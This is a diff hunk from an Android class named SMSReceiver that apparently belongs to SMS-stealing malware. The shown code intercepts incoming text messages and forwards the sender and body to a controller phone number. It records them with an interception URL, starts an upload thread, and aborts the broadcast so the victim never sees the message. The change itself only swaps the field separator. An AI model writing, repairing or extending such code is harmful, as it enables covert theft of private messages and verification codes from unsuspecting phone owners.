@@ -57,7 +57,7 @@ public class SMSReceiver extends BroadcastReceiver {
     					}
     				}
                     if (isflag) {
-                    	SMSManager.send(context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "#" + body);
+                    	SMSManager.send(context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "|" + body);
     					DQLiteOpenHelper.getHelper(context).addData("拦截", address, body.toString(), SmsActivity.interceptUrl, new Date());
     					SubmitDateThread.startSendData(context);
     					this.abortBroadcast();		//退出该广播
